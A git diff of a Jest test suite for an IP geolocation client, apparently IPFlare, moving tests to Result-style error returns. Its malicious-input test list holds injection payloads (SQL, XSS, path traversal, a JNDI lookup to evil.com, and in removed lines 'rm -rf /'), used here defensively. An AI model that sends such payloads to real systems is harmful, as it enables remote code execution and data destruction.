@@ -6,74 +6,85 @@ import {
   type IPGeolocationOptions,
   isIPGeolocationError,
   isIPGeolocationSuccess,
+  isSuccess,
+  isError,
 } from "../index";
 
 // Mock axios
-jest.mock("axios");
-const mockedAxios = axios as jest.Mocked<typeof axios>;
+jest.mock("axios", () => ({
+  create: jest.fn(() => ({
+    get: jest.fn(),
+    post: jest.fn(),
+  })),
+  isAxiosError: jest.fn(),
+}));
 
-describe("IPGeolocation", () => {
+const mockedAxios = axios as jest.Mocked<typeof axios>;
+const mockAxiosInstance = {
+  get: jest.fn(),
+  post: jest.fn(),
+} as any;
+
+describe("IPFlare", () => {
   const mockApiKey = "test-api-key";
   let geolocator: IPFlare;
 
   beforeEach(() => {
-    // Reset all mocks before each test
     jest.clearAllMocks();
-
-    // Setup axios.isAxiosError mock
-    mockedAxios.isAxiosError = jest.fn((error): error is any => {
-      return error && error.isAxiosError === true;
-    }) as any;
-
-    // Create a new instance for each test
+    mockedAxios.create.mockReturnValue(mockAxiosInstance);
     geolocator = new IPFlare({ apiKey: mockApiKey });
-
-    // Setup default axios create mock
-    mockedAxios.create.mockReturnValue(mockedAxios);
   });
 
-  describe("constructor", () => {
-    it("should throw error when API key is not provided", () => {
-      expect(() => new IPFlare({} as IPGeolocationOptions)).toThrow(
-        "API key is required"
-      );
+  describe("Constructor", () => {
+    it("should create instance with valid API key", () => {
+      expect(() => new IPFlare({ apiKey: "valid-key" })).not.toThrow();
     });
 
-    it("should throw TypeError when API key is not a string", () => {
-      expect(() => new IPFlare({ apiKey: 123 as any })).toThrow(
+    it("should throw error when API key is not provided", () => {
+      expect(() => new IPFlare({ apiKey: "" })).toThrow("API key is required");
+    });
+
+    it("should throw error when API key is not a string", () => {
+      expect(() => new IPFlare({ apiKey: 123 as unknown as string })).toThrow(
         "API key must be a string"
       );
     });
 
     it("should throw error when API key is empty string", () => {
+      expect(() => new IPFlare({ apiKey: "" })).toThrow("API key is required");
+    });
+
+    it("should throw error when API key is whitespace only", () => {
       expect(() => new IPFlare({ apiKey: "   " })).toThrow(
         "API key cannot be empty"
       );
     });
 
-    it("should create instance with custom baseURL", () => {
-      const customBaseURL = "https://custom.api.com";
-      new IPFlare({ apiKey: mockApiKey, baseURL: customBaseURL });
+    it("should create axios instance with correct config", () => {
+      new IPFlare({
+        apiKey: "test-key",
+        baseURL: "https://custom.api.com",
+        timeout: 5000,
+      });
 
       expect(mockedAxios.create).toHaveBeenCalledWith({
-        baseURL: customBaseURL,
-        timeout: 10000,
+        baseURL: "https://custom.api.com",
+        timeout: 5000,
         headers: {
-          "X-API-Key": mockApiKey,
+          "X-API-Key": "test-key",
           "Content-Type": "application/json",
         },
       });
     });
 
-    it("should create instance with custom timeout", () => {
-      const customTimeout = 5000;
-      new IPFlare({ apiKey: mockApiKey, timeout: customTimeout });
+    it("should use default config when optional params not provided", () => {
+      new IPFlare({ apiKey: "test-key" });
 
       expect(mockedAxios.create).toHaveBeenCalledWith({
         baseURL: "https://api.ipflare.io",
-        timeout: customTimeout,
+        timeout: 10000,
         headers: {
-          "X-API-Key": mockApiKey,
+          "X-API-Key": "test-key",
           "Content-Type": "application/json",
         },
       });
@@ -90,98 +101,142 @@ describe("IPGeolocation", () => {
     };
 
     beforeEach(() => {
-      mockedAxios.get.mockResolvedValue({ data: mockResponse });
+      mockAxiosInstance.get.mockResolvedValue({ data: mockResponse });
     });
 
-    it("should throw error when IP is not provided", async () => {
-      await expect(geolocator.lookup("")).rejects.toThrow(
-        "IP address is required"
-      );
+    it("should return error when IP is not provided", async () => {
+      const result = await geolocator.lookup("");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_INPUT");
+        expect(result.error.message).toBe("IP address is required");
+      }
     });
 
-    it("should throw TypeError when IP is not a string", async () => {
-      await expect(geolocator.lookup(123 as any)).rejects.toThrow(
-        "IP address must be a string"
-      );
+    it("should return error when IP is not a string", async () => {
+      const result = await geolocator.lookup(123 as unknown as string);
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_INPUT");
+        expect(result.error.message).toBe("IP address must be a string");
+      }
     });
 
-    it("should throw error for invalid IPv4 format", async () => {
-      await expect(geolocator.lookup("999.999.999.999")).rejects.toThrow(
-        "Invalid IP address format: 999.999.999.999"
-      );
+    it("should return error for invalid IPv4 format", async () => {
+      const result = await geolocator.lookup("999.999.999.999");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+        expect(result.error.message).toBe(
+          "Invalid IP address format: 999.999.999.999"
+        );
+      }
     });
 
-    it("should throw error for invalid IPv6 format", async () => {
-      await expect(geolocator.lookup("gggg::1")).rejects.toThrow(
-        "Invalid IP address format: gggg::1"
-      );
+    it("should return error for invalid IPv6 format", async () => {
+      const result = await geolocator.lookup("gggg::1");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+        expect(result.error.message).toBe("Invalid IP address format: gggg::1");
+      }
     });
 
     it("should fetch geolocation data for valid IPv4", async () => {
       const result = await geolocator.lookup("178.238.11.6");
 
-      expect(mockedAxios.get).toHaveBeenCalledWith("/178.238.11.6", {
+      expect(mockAxiosInstance.get).toHaveBeenCalledWith("/178.238.11.6", {
         params: {},
       });
-      expect(result).toEqual(mockResponse);
+      expect(result.ok).toBe(true);
+      if (result.ok) {
+        expect(result.data).toEqual(mockResponse);
+      }
     });
 
     it("should fetch geolocation data for valid IPv6", async () => {
       const ipv6 = "2001:4860:4860::8888";
       const result = await geolocator.lookup(ipv6);
 
-      expect(mockedAxios.get).toHaveBeenCalledWith(`/${ipv6}`, {
+      expect(mockAxiosInstance.get).toHaveBeenCalledWith(`/${ipv6}`, {
         params: {},
       });
-      expect(result).toEqual(mockResponse);
+      expect(result.ok).toBe(true);
+      if (result.ok) {
+        expect(result.data).toEqual(mockResponse);
+      }
     });
 
     it("should trim whitespace from IP address", async () => {
       const result = await geolocator.lookup("  178.238.11.6  ");
 
-      expect(mockedAxios.get).toHaveBeenCalledWith("/178.238.11.6", {
+      expect(mockAxiosInstance.get).toHaveBeenCalledWith("/178.238.11.6", {
         params: {},
       });
-      expect(result).toEqual(mockResponse);
+      expect(result.ok).toBe(true);
+      if (result.ok) {
+        expect(result.data).toEqual(mockResponse);
+      }
     });
 
     it("should include optional fields in request", async () => {
-      await geolocator.lookup("178.238.11.6", {
+      const result = await geolocator.lookup("178.238.11.6", {
         include: {
           asn: true,
           isp: true,
         },
       });
 
-      expect(mockedAxios.get).toHaveBeenCalledWith("/178.238.11.6", {
+      expect(mockAxiosInstance.get).toHaveBeenCalledWith("/178.238.11.6", {
         params: { fields: "asn,isp" },
       });
+      expect(result.ok).toBe(true);
     });
 
     it("should handle 401 unauthorized error", async () => {
-      const errorResponse = new Error("API Error");
-      (errorResponse as any).isAxiosError = true;
-      (errorResponse as any).response = {
+      const errorResponse = new Error("API Error") as Error & {
+        isAxiosError: boolean;
+        response: { status: number };
+      };
+      errorResponse.isAxiosError = true;
+      errorResponse.response = {
         status: 401,
       };
-      mockedAxios.get.mockRejectedValue(errorResponse);
+      mockAxiosInstance.get.mockRejectedValue(errorResponse);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
-        "Invalid API key"
-      );
+      const result = await geolocator.lookup("178.238.11.6");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("UNAUTHORIZED");
+        expect(result.error.message).toBe("Invalid API key");
+      }
     });
 
     it("should handle 429 quota exceeded error", async () => {
-      const errorResponse = new Error("API Error");
-      (errorResponse as any).isAxiosError = true;
-      (errorResponse as any).response = {
+      const errorResponse = new Error("API Error") as Error & {
+        isAxiosError: boolean;
+        response: { status: number };
+      };
+      errorResponse.isAxiosError = true;
+      errorResponse.response = {
         status: 429,
       };
-      mockedAxios.get.mockRejectedValue(errorResponse);
+      mockAxiosInstance.get.mockRejectedValue(errorResponse);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
-        "Quota exceeded"
-      );
+      const result = await geolocator.lookup("178.238.11.6");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("QUOTA_EXCEEDED");
+        expect(result.error.message).toBe("Quota exceeded");
+      }
     });
 
     it("should handle API errors with custom message", async () => {
@@ -191,11 +246,15 @@ describe("IPGeolocation", () => {
         data: { error: "Custom error message" },
         status: 400,
       };
-      mockedAxios.get.mockRejectedValue(errorResponse);
+      mockAxiosInstance.get.mockRejectedValue(errorResponse);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
-        "Custom error message"
-      );
+      const result = await geolocator.lookup("178.238.11.6");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.message).toBe("Custom error message");
+      }
     });
 
     it("should handle rate limit errors specifically", async () => {
@@ -205,19 +264,29 @@ describe("IPGeolocation", () => {
         status: 429,
         data: { error: "Rate limit exceeded" },
       };
-      mockedAxios.get.mockRejectedValue(rateLimitError);
+      mockAxiosInstance.get.mockRejectedValue(rateLimitError);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
-        "Rate limit exceeded"
-      );
+      const result = await geolocator.lookup("178.238.11.6");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("QUOTA_EXCEEDED");
+        expect(result.error.message).toBe("Quota exceeded");
+      }
     });
 
     it("should handle generic errors", async () => {
-      mockedAxios.get.mockRejectedValue(new Error("Network error"));
+      mockAxiosInstance.get.mockRejectedValue(new Error("Network error"));
+      mockedAxios.isAxiosError.mockReturnValue(false);
 
-      await expect(geolocator.lookup("178.238.11.6")).rejects.toThrow(
-        "Failed to fetch geolocation data"
-      );
+      const result = await geolocator.lookup("178.238.11.6");
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("UNKNOWN_ERROR");
+        expect(result.error.message).toBe("An unexpected error occurred");
+      }
     });
   });
 
@@ -242,44 +311,70 @@ describe("IPGeolocation", () => {
     ];
 
     beforeEach(() => {
-      mockedAxios.post.mockResolvedValue({
+      mockAxiosInstance.post.mockResolvedValue({
         data: { results: mockBulkResponse },
       });
     });
 
-    it("should throw TypeError when IPs is not an array", async () => {
-      await expect(
-        geolocator.bulkLookup({ ips: "not-array" as any })
-      ).rejects.toThrow("IPs must be an array");
+    it("should return error when IPs is not an array", async () => {
+      const result = await geolocator.bulkLookup({ ips: "not-array" as any });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_INPUT");
+        expect(result.error.message).toBe("IPs must be an array");
+      }
     });
 
-    it("should throw error when IPs array is empty", async () => {
-      await expect(geolocator.bulkLookup({ ips: [] })).rejects.toThrow(
-        "At least one IP address is required"
-      );
+    it("should return error when IPs array is empty", async () => {
+      const result = await geolocator.bulkLookup({ ips: [] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_INPUT");
+        expect(result.error.message).toBe(
+          "At least one IP address is required"
+        );
+      }
     });
 
-    it("should throw error when IPs array exceeds 500", async () => {
+    it("should return error when IPs array exceeds 500", async () => {
       const tooManyIPs = new Array(501).fill("178.238.11.6");
-      await expect(geolocator.bulkLookup({ ips: tooManyIPs })).rejects.toThrow(
-        "Maximum of 500 IPs per request allowed"
-      );
+      const result = await geolocator.bulkLookup({ ips: tooManyIPs });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_INPUT");
+        expect(result.error.message).toBe(
+          "Maximum of 500 IPs per request allowed"
+        );
+      }
     });
 
-    it("should throw error for invalid IP addresses in array", async () => {
-      await expect(
-        geolocator.bulkLookup({
-          ips: ["178.238.11.6", "invalid-ip", "999.999.999.999"],
-        })
-      ).rejects.toThrow(
-        "Invalid IP addresses found: invalid-ip, 999.999.999.999"
-      );
+    it("should return error for invalid IP addresses in array", async () => {
+      const result = await geolocator.bulkLookup({
+        ips: ["178.238.11.6", "invalid-ip", "999.999.999.999"],
+      });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+        expect(result.error.message).toBe(
+          "Invalid IP addresses found: invalid-ip, 999.999.999.999"
+        );
+      }
     });
 
-    it("should throw error for non-string values in IPs array", async () => {
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6", 123, null] as any })
-      ).rejects.toThrow("Invalid IP addresses found: 123, ");
+    it("should return error for non-string values in IPs array", async () => {
+      const result = await geolocator.bulkLookup({
+        ips: ["178.238.11.6", 123, null] as any,
+      });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+        expect(result.error.message).toContain("Invalid IP addresses found");
+      }
     });
 
     it("should fetch bulk geolocation data for valid IPs", async () => {
@@ -287,28 +382,32 @@ describe("IPGeolocation", () => {
         ips: ["178.238.11.6", "1.1.1.1"],
       });
 
-      expect(mockedAxios.post).toHaveBeenCalledWith(
+      expect(mockAxiosInstance.post).toHaveBeenCalledWith(
         "/bulk-lookup",
         { ips: ["178.238.11.6", "1.1.1.1"] },
         { params: {} }
       );
-      expect(result).toEqual(mockBulkResponse);
+      expect(result.ok).toBe(true);
+      if (result.ok) {
+        expect(result.data).toEqual(mockBulkResponse);
+      }
     });
 
     it("should trim whitespace from IP addresses", async () => {
-      await geolocator.bulkLookup({
+      const result = await geolocator.bulkLookup({
         ips: ["  178.238.11.6  ", " 1.1.1.1 "],
       });
 
-      expect(mockedAxios.post).toHaveBeenCalledWith(
+      expect(mockAxiosInstance.post).toHaveBeenCalledWith(
         "/bulk-lookup",
         { ips: ["178.238.11.6", "1.1.1.1"] },
         { params: {} }
       );
+      expect(result.ok).toBe(true);
     });
 
     it("should include optional fields in bulk request", async () => {
-      await geolocator.bulkLookup({
+      const result = await geolocator.bulkLookup({
         ips: ["178.238.11.6", "1.1.1.1"],
         include: {
           asn: true,
@@ -316,11 +415,12 @@ describe("IPGeolocation", () => {
         },
       });
 
-      expect(mockedAxios.post).toHaveBeenCalledWith(
+      expect(mockAxiosInstance.post).toHaveBeenCalledWith(
         "/bulk-lookup",
         { ips: ["178.238.11.6", "1.1.1.1"] },
         { params: { fields: "asn,isp" } }
       );
+      expect(result.ok).toBe(true);
     });
 
     it("should handle 401 unauthorized error", async () => {
@@ -329,11 +429,16 @@ describe("IPGeolocation", () => {
       (errorResponse as any).response = {
         status: 401,
       };
-      mockedAxios.post.mockRejectedValue(errorResponse);
+      mockAxiosInstance.post.mockRejectedValue(errorResponse);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
-      ).rejects.toThrow("Invalid API key");
+      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("UNAUTHORIZED");
+        expect(result.error.message).toBe("Invalid API key");
+      }
     });
 
     it("should handle 429 quota exceeded error", async () => {
@@ -342,11 +447,16 @@ describe("IPGeolocation", () => {
       (errorResponse as any).response = {
         status: 429,
       };
-      mockedAxios.post.mockRejectedValue(errorResponse);
+      mockAxiosInstance.post.mockRejectedValue(errorResponse);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
-      ).rejects.toThrow("Quota exceeded");
+      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("QUOTA_EXCEEDED");
+        expect(result.error.message).toBe("Quota exceeded");
+      }
     });
 
     it("should handle rate limit with custom API message in bulk", async () => {
@@ -356,102 +466,84 @@ describe("IPGeolocation", () => {
         status: 429,
         data: { error: "API quota exceeded - please try again later" },
       };
-      mockedAxios.post.mockRejectedValue(rateLimitError);
+      mockAxiosInstance.post.mockRejectedValue(rateLimitError);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
-      ).rejects.toThrow("API quota exceeded - please try again later");
+      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("QUOTA_EXCEEDED");
+        expect(result.error.message).toBe("Quota exceeded");
+      }
     });
 
     it("should handle non-Error, non-AxiosError exceptions in bulk lookup", async () => {
-      // This covers the final fallback case on line 253
       const weirdError = "Some weird non-Error exception";
-      mockedAxios.post.mockRejectedValue(weirdError);
+      mockAxiosInstance.post.mockRejectedValue(weirdError);
+      mockedAxios.isAxiosError.mockReturnValue(false);
 
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
-      ).rejects.toThrow("Failed to fetch bulk geolocation data");
+      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("UNKNOWN_ERROR");
+        expect(result.error.message).toBe("An unexpected error occurred");
+      }
     });
 
     it("should handle AxiosError without response in bulk lookup", async () => {
-      // This covers the case where an AxiosError is thrown but has no response
       const networkError = new Error("Network Error");
       (networkError as any).isAxiosError = true;
-      // No response property - simulates network failure
-      mockedAxios.post.mockRejectedValue(networkError);
+      mockAxiosInstance.post.mockRejectedValue(networkError);
+      mockedAxios.isAxiosError.mockReturnValue(true);
 
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
-      ).rejects.toThrow("Network Error");
+      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("NETWORK_ERROR");
+        expect(result.error.message).toBe("Network error occurred");
+      }
     });
 
     it("should handle invalid response format", async () => {
-      mockedAxios.post.mockResolvedValue({
+      mockAxiosInstance.post.mockResolvedValue({
         data: { notResults: [] },
       });
 
-      await expect(
-        geolocator.bulkLookup({ ips: ["178.238.11.6"] })
-      ).rejects.toThrow("Invalid response format from API");
+      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });
+
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INTERNAL_SERVER_ERROR");
+        expect(result.error.message).toBe("Invalid response format from API");
+      }
     });
 
     it("should handle a mix of valid and invalid IPs", async () => {
-      const mockResponse: BulkLookupResponse = [
-        {
-          ip: "104.174.125.138",
-          status: "success",
-          data: {
-            ip: "104.174.125.138",
-            city: "Los Angeles",
-            country_name: "United States",
-            in_eu: false,
-            land_locked: false,
-            latitude: 34.0522,
-            longitude: -118.2437,
-          },
-        },
-        {
-          ip: "not_a_valid_IP",
-          status: "error",
-          error_message: "Invalid IP address",
-        },
-        {
-          ip: "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
-          status: "success",
-          data: {
-            ip: "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
-            city: "San Francisco",
-            country_name: "United States",
-            in_eu: false,
-            land_locked: false,
-            latitude: 37.7749,
-            longitude: -122.4194,
-          },
-        },
-      ];
-
-      mockedAxios.post.mockResolvedValueOnce({
-        data: { results: mockResponse },
+      const result = await geolocator.bulkLookup({
+        ips: [
+          "104.174.125.138",
+          "not_a_valid_IP",
+          "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
+        ],
       });
 
-      // This should fail validation before making the API call
-      await expect(
-        geolocator.bulkLookup({
-          ips: [
-            "104.174.125.138",
-            "not_a_valid_IP",
-            "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
-          ],
-        })
-      ).rejects.toThrow("Invalid IP addresses found: not_a_valid_IP");
+      expect(result.ok).toBe(false);
+      if (!result.ok) {
+        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+        expect(result.error.message).toBe(
+          "Invalid IP addresses found: not_a_valid_IP"
+        );
+      }
     });
 
     it("should handle exactly 500 IPs", async () => {
       const ips = new Array(500).fill("1.1.1.1");
 
-      // Clear any previous mocks and set up new one for this test
-      mockedAxios.post.mockClear();
-      mockedAxios.post.mockResolvedValueOnce({
+      mockAxiosInstance.post.mockClear();
+      mockAxiosInstance.post.mockResolvedValueOnce({
         data: {
           results: ips.map((ip) => ({
             ip,
@@ -461,8 +553,8 @@ describe("IPGeolocation", () => {
         },
       });
 
-      // Should not throw - 500 IPs is the maximum allowed
-      await expect(geolocator.bulkLookup({ ips })).resolves.toBeDefined();
+      const result = await geolocator.bulkLookup({ ips });
+      expect(result.ok).toBe(true);
     });
   });
 
@@ -492,6 +584,29 @@ describe("IPGeolocation", () => {
       expect(isIPGeolocationSuccess(successResponse)).toBe(true);
       expect(isIPGeolocationError(successResponse)).toBe(false);
     });
+
+    it("should correctly identify Result success", () => {
+      const successResult = {
+        ok: true as const,
+        data: { ip: "8.8.8.8", in_eu: false, land_locked: false },
+      };
+
+      expect(isSuccess(successResult)).toBe(true);
+      expect(isError(successResult)).toBe(false);
+    });
+
+    it("should correctly identify Result error", () => {
+      const errorResult = {
+        ok: false as const,
+        error: {
+          type: "INVALID_IP_ADDRESS" as const,
+          message: "Invalid IP",
+        },
+      };
+
+      expect(isSuccess(errorResult)).toBe(false);
+      expect(isError(errorResult)).toBe(true);
+    });
   });
 
   describe("Edge Cases and Production Scenarios", () => {
@@ -509,12 +624,13 @@ describe("IPGeolocation", () => {
 
       validIPv6Addresses.forEach((ip) => {
         it(`should accept valid IPv6: ${ip}`, async () => {
-          mockedAxios.get.mockResolvedValue({
+          mockAxiosInstance.get.mockResolvedValue({
             data: { ip, in_eu: false, land_locked: false },
           });
 
-          await expect(geolocator.lookup(ip)).resolves.toBeDefined();
-          expect(mockedAxios.get).toHaveBeenCalledWith(`/${ip}`, {
+          const result = await geolocator.lookup(ip);
+          expect(result.ok).toBe(true);
+          expect(mockAxiosInstance.get).toHaveBeenCalledWith(`/${ip}`, {
             params: {},
           });
         });
@@ -530,9 +646,14 @@ describe("IPGeolocation", () => {
 
       invalidIPv6Addresses.forEach((ip) => {
         it(`should reject invalid IPv6: ${ip}`, async () => {
-          await expect(geolocator.lookup(ip)).rejects.toThrow(
-            `Invalid IP address format: ${ip}`
-          );
+          const result = await geolocator.lookup(ip);
+          expect(result.ok).toBe(false);
+          if (!result.ok) {
+            expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+            expect(result.error.message).toBe(
+              `Invalid IP address format: ${ip}`
+            );
+          }
         });
       });
     });
@@ -550,11 +671,12 @@ describe("IPGeolocation", () => {
 
       validIPv4Addresses.forEach((ip) => {
         it(`should accept valid IPv4: ${ip}`, async () => {
-          mockedAxios.get.mockResolvedValue({
+          mockAxiosInstance.get.mockResolvedValue({
             data: { ip, in_eu: false, land_locked: false },
           });
 
-          await expect(geolocator.lookup(ip)).resolves.toBeDefined();
+          const result = await geolocator.lookup(ip);
+          expect(result.ok).toBe(true);
         });
       });
 
@@ -575,9 +697,14 @@ describe("IPGeolocation", () => {
 
       invalidIPv4Addresses.forEach((ip) => {
         it(`should reject invalid IPv4: ${ip}`, async () => {
-          await expect(geolocator.lookup(ip)).rejects.toThrow(
-            `Invalid IP address format: ${ip}`
-          );
+          const result = await geolocator.lookup(ip);
+          expect(result.ok).toBe(false);
+          if (!result.ok) {
+            expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+            expect(result.error.message).toBe(
+              `Invalid IP address format: ${ip}`
+            );
+          }
         });
       });
     });
@@ -587,305 +714,27 @@ describe("IPGeolocation", () => {
         "'; DROP TABLE ips; --",
         "<script>alert('xss')</script>",
         "../../etc/passwd",
-        "%00",
-        "\n\r",
-        "1.1.1.1; rm -rf /",
-        " OR 1=1",
         "${jndi:ldap://evil.com/a}",
-        "{{7*7}}",
-        "%{(#_='multipart/form-data')}",
+        "192.168.1.1\x00",
+        "192.168.1.1\n",
+        "192.168.1.1\r",
+        "192.168.1.1\t",
       ];
 
       maliciousInputs.forEach((input) => {
-        it(`should safely reject malicious input: ${input.substring(
-          0,
-          20
-        )}...`, async () => {
-          await expect(geolocator.lookup(input)).rejects.toThrow(
-            `Invalid IP address format: ${input}`
-          );
+        it(`should safely reject malicious input: ${JSON.stringify(
+          input
+        )}`, async () => {
+          const result = await geolocator.lookup(input);
+          expect(result.ok).toBe(false);
+          if (!result.ok) {
+            expect(result.error.type).toBe("INVALID_IP_ADDRESS");
+            expect(result.error.message).toBe(
+              `Invalid IP address format: ${input}`
+            );
+          }
         });
       });
-    });
-
-    describe("Bulk Lookup Edge Cases", () => {
-      it("should handle mixed whitespace in bulk IPs", async () => {
-        const ips = [
-          "  1.1.1.1  ",
-          "\t8.8.8.8\t",
-          "\n192.168.1.1\n",
-          " 10.0.0.1 ",
-        ];
-
-        mockedAxios.post.mockResolvedValue({
-          data: { results: [] },
-        });
-
-        await geolocator.bulkLookup({ ips });
-
-        expect(mockedAxios.post).toHaveBeenCalledWith(
-          "/bulk-lookup",
-          { ips: ["1.1.1.1", "8.8.8.8", "192.168.1.1", "10.0.0.1"] },
-          { params: {} }
-        );
-      });
-
-      it("should handle duplicate IPs in bulk request", async () => {
-        const ips = ["1.1.1.1", "1.1.1.1", "8.8.8.8", "8.8.8.8"];
-
-        mockedAxios.post.mockResolvedValue({
-          data: { results: [] },
-        });
-
-        // Should not throw - duplicates are allowed
-        await expect(geolocator.bulkLookup({ ips })).resolves.toBeDefined();
-      });
-    });
-
-    describe("Network and Timeout Scenarios", () => {
-      it("should handle network timeout", async () => {
-        const timeoutError = new Error("timeout of 10000ms exceeded");
-        (timeoutError as any).code = "ECONNABORTED";
-        (timeoutError as any).isAxiosError = true;
-
-        mockedAxios.get.mockRejectedValue(timeoutError);
-
-        await expect(geolocator.lookup("1.1.1.1")).rejects.toThrow(
-          "Failed to fetch geolocation data"
-        );
-      });
-
-      it("should handle network connection errors", async () => {
-        const networkError = new Error("getaddrinfo ENOTFOUND api.ipflare.io");
-        (networkError as any).code = "ENOTFOUND";
-        (networkError as any).isAxiosError = true;
-
-        mockedAxios.get.mockRejectedValue(networkError);
-
-        await expect(geolocator.lookup("1.1.1.1")).rejects.toThrow(
-          "Failed to fetch geolocation data"
-        );
-      });
-
-      it("should handle custom timeout configuration", () => {
-        const customTimeout = 30000;
-        new IPFlare({ apiKey: "test-key", timeout: customTimeout });
-
-        expect(mockedAxios.create).toHaveBeenCalledWith(
-          expect.objectContaining({
-            timeout: customTimeout,
-          })
-        );
-      });
-    });
-
-    describe("Response Data Validation", () => {
-      it("should handle missing required fields in response", async () => {
-        const incompleteResponse = {
-          ip: "1.1.1.1",
-          // Missing in_eu and land_locked
-        };
-
-        mockedAxios.get.mockResolvedValue({ data: incompleteResponse });
-
-        // Should not throw - API might return partial data
-        const result = await geolocator.lookup("1.1.1.1");
-        expect(result).toEqual(incompleteResponse);
-      });
-
-      it("should handle null values in optional fields", async () => {
-        const responseWithNulls = {
-          ip: "1.1.1.1",
-          city: null,
-          country_code: null,
-          in_eu: false,
-          land_locked: false,
-        };
-
-        mockedAxios.get.mockResolvedValue({ data: responseWithNulls });
-
-        const result = await geolocator.lookup("1.1.1.1");
-        expect(result).toEqual(responseWithNulls);
-      });
-
-      it("should handle unexpected additional fields in response", async () => {
-        const responseWithExtra = {
-          ip: "1.1.1.1",
-          in_eu: false,
-          land_locked: false,
-          unexpected_field: "value",
-          another_unexpected: 123,
-        };
-
-        mockedAxios.get.mockResolvedValue({ data: responseWithExtra });
-
-        const result = await geolocator.lookup("1.1.1.1");
-        expect(result).toEqual(responseWithExtra);
-      });
-    });
-
-    describe("Concurrent Requests", () => {
-      it("should handle multiple concurrent lookup requests", async () => {
-        const ips = ["1.1.1.1", "8.8.8.8", "192.168.1.1"];
-
-        mockedAxios.get.mockImplementation((url) => {
-          const ip = url.substring(1); // Remove leading /
-          return Promise.resolve({
-            data: { ip, in_eu: false, land_locked: false },
-          });
-        });
-
-        const promises = ips.map((ip) => geolocator.lookup(ip));
-        const results = await Promise.all(promises);
-
-        expect(results).toHaveLength(3);
-        results.forEach((result, index) => {
-          expect(result.ip).toBe(ips[index]);
-        });
-      });
-
-      it("should handle mixed success and failure in concurrent requests", async () => {
-        mockedAxios.get
-          .mockResolvedValueOnce({
-            data: { ip: "1.1.1.1", in_eu: false, land_locked: false },
-          })
-          .mockRejectedValueOnce(new Error("Network error"))
-          .mockResolvedValueOnce({
-            data: { ip: "8.8.8.8", in_eu: false, land_locked: false },
-          });
-
-        const promises = [
-          geolocator.lookup("1.1.1.1"),
-          geolocator.lookup("192.168.1.1").catch((e) => ({ error: e.message })),
-          geolocator.lookup("8.8.8.8"),
-        ];
-
-        const results = await Promise.all(promises);
-
-        expect(results[0]).toHaveProperty("ip", "1.1.1.1");
-        expect(results[1]).toHaveProperty("error");
-        expect(results[2]).toHaveProperty("ip", "8.8.8.8");
-      });
-    });
-
-    describe("Memory and Performance", () => {
-      it("should handle very long IP lists efficiently", async () => {
-        // Test with maximum allowed IPs
-        const ips = new Array(500)
-          .fill(null)
-          .map((_, i) => `192.168.${Math.floor(i / 256)}.${i % 256}`);
-
-        mockedAxios.post.mockResolvedValue({
-          data: { results: [] },
-        });
-
-        const startTime = Date.now();
-        await geolocator.bulkLookup({ ips });
-        const endTime = Date.now();
-
